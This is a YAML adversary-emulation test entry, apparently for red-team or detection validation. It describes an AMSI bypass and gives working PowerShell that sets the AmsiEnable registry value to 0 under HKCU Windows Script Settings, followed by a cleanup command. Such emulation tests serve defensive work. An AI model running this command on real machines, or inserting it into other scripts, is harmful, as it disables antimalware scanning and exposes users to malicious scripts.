- id: 58e307e2-8902-5e78-b72e-e7c8d7ee4ae5
  name: Soumaia ART Tests - AMSI Bypass - Create AMSIEnable Reg Key
  description: 'Threat Actor could disable the AMSI function by adding a registry value name “AmsiEnable” to the registry key “HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable” and set its value to 0.

    Ref: https://mostafayahiax.medium.com/hunting-for-amsi-bypassing-methods-9886dda0bf9d (requires elevation)'
  tactic: defense-impairment
  technique:
    attack_id: T1685
    name: Disable or Modify Tools
  platforms:
    windows:
      psh:
        command: |-
          New-Item -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Force | Out-Null
          New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Name "AmsiEnable" -Value 0 -PropertyType DWORD -Force | Out-Null
        cleanup: |-
          Remove-Item -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Recurse -Force 2> $null
